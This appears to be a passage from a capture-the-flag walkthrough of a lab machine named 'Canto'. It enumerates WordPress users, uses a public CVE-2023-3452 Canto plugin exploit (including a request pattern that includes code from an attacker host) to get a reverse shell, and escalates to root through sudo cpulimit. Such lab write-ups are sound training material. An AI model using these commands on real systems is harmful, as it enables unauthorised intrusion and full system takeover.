### WordPress Enum

Thanks to **WPScan**, we can enumerate Wordpress users : 
```bash
wpscan --url 'http://192.168.1.200/' -e u
```

Only one user is found : 
```bash
[i] User(s) Identified:

[+] erik
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://192.168.1.200/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
```

We can try to bruteforce `wp-login.php` form but it won't work.

> I got stuck here, but then I remembered that the machine name is often a clue.
{: .prompt-tip }

So, I searched for `Canto exploit WordPress` on Google and I found this [exploit](https://github.com/leoanggal1/CVE-2023-3452-PoC).

First, check if this plugin is installed on the server. Go to `http://192.168.1.200/wp-content/plugins/canto/` : 

![Canto](../assets/img/canto/url.png)

Yes, it is ! The plugin is probably vulnerable. 

> If we look at the python script, we see that the vulnerability appears in the `wp_abspath=` parameter. It allows url inclusion so a malicious actor could host a command line file `/wp-admin/admin.php` and make the following request : `/wp-content/plugins/canto/includes/lib/download.php?wp_abspath=http://<IP-ATTACKER>:8080&cmd=whoami`. The command is executed because the plugin blindly appends `/wp-admin/admin.php` to the provided URL.
{: .prompt-info }

Use the exploit to get a reverse shell : 
```bash
python3 CVE-2023-3452.py -u http://192.168.1.200 -LHOST 192.168.1.43 -NC_PORT 1337 -s shell.php
```

It works ! Type `id` and we are `www-data`.

> Never execute a random "exploit" found on Internet. Always read and understand the code before !
{: .prompt-danger }

## ▫️ Root

To finish, we need to gain root privileges.

Check sudo permissions with ``sudo -l`` :
```bash
erik@canto:~$ sudo -l
Matching Defaults entries for erik on canto:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User erik may run the following commands on canto:
    (ALL : ALL) NOPASSWD: /usr/bin/cpulimit
erik@canto:~$
```

Thanks to [GTFOBins](https://gtfobins.github.io/gtfobins/cpulimit/), we can check if `cpulimit` command can be abused. 

By using this command : ``sudo cpulimit -l 100 -f /bin/sh``, we will be able to become root :

```bash
# id && pwd     
uid=0(root) gid=0(root) groups=0(root)
/root
#
```

We are root ! Read the final flag : 

```bash
# cat root.txt
1b56eefaab2c896e57c874a635b24b49
#
```
